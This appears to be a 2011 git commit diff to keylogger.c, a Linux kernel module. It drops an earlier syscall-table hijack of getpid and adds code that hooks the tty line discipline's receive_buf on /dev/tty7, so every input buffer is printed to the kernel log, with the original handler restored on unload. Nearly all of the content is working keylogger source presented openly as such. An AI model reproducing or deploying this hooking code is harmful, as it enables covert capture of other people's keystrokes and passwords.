b24659553a5b2f4de843828a31c84c5e50f44bbc
jnavarro <jesus_navarro88@yahoo.com>
2011-11-17 12:24:43 -0800

    successfully writes receive_buf

--- keylogger.c
+++ keylogger.c
@@ -8,31 +8,18 @@
 #include <linux/fs.h>
 #include "headers/kfile.h" // file operations
 
-// this file, as it stands, is just a proof of concept. It doesn't
-// keylog anything, it just hijacks the getpid syscall.
-
-// these memory locations are specific to 32-bit systems
-#define START_MEM 0xc0000000
-#define END_MEM 0xd0000000
-
 // a module license is required for most modules to run
 MODULE_LICENSE("GPL");
 
-// lets us make system calls within kernel
-// this will point to the syscall_table
-unsigned long *syscall_table;
-
-// pointer to the original sys_getpid call. When we
-asmlinkage long (*original_getpid)(void);
-
-// our replacement sys_getpid
-asmlinkage long new_getpid(void) {
-  // hijacked getpid
-  printk(KERN_ALERT "GETPID HIJACKED");
-  // call the original function
-  return original_getpid();
+// pointer to the old receive_buf function
+void (*old_receive_buf)(struct tty_struct*,const unsigned char*,
+			char*,int);
+void new_receive_buf(struct tty_struct* tty, const unsigned char* cp,
+		     char* fp, int count){
+  printk(KERN_ALERT "buffer is %s\n",cp);
+  // call the old function
+  old_receive_buf(tty,cp,fp,count);
 }
-
 static int init(void) {
   // our structs
   struct tty_struct* tty = NULL;
@@ -48,11 +35,11 @@ static int init(void) {
     if(priv) tty=priv->tty;
     if(tty){
       printk(KERN_ALERT "this is a valid tty\n");
-      if(tty->ldisc->ops->read){
-	char buffer[256];
-	size_t count = 1;
-	(tty->ldisc->ops->read)(tty,file,buffer,count);
-	printk(KERN_ALERT "contents = %c %x\n",buffer[0],buffer[0]);
+      if(tty->ldisc->ops->receive_buf){
+	//printk(KERN_ALERT "has receive_buf\n");
+	//change the old receive_buf
+	old_receive_buf = tty->ldisc->ops->receive_buf;
+	tty->ldisc->ops->receive_buf = new_receive_buf;
       }
     }
   }
@@ -61,6 +48,29 @@ static int init(void) {
 }
 	 
 static void exit(void) {
+// our structs
+  struct tty_struct* tty = NULL;
+  struct file* file = NULL;
+  char* dev_name = "/dev/tty7";
+
+  // open the tty
+  file = kopen(dev_name,LF_FLAGS,LF_PERMS);
+  if(file){
+    printk(KERN_ALERT "tty was opened\n");
+    struct tty_file_private* priv = NULL;
+    priv = file->private_data;
+    if(priv) tty=priv->tty;
+    if(tty){
+      printk(KERN_ALERT "this is a valid tty\n");
+      if(tty->ldisc->ops->receive_buf){
+	//printk(KERN_ALERT "has receive_buf\n");
+	//change the old receive_buf
+	//old_receive_buf = tty->ldisc->ops->receive_buf;
+	tty->ldisc->ops->receive_buf = old_receive_buf;
+      }
+    }
+  }
+  kclose(file);
 }
 
 // sets our custom functions as the init and exit functions
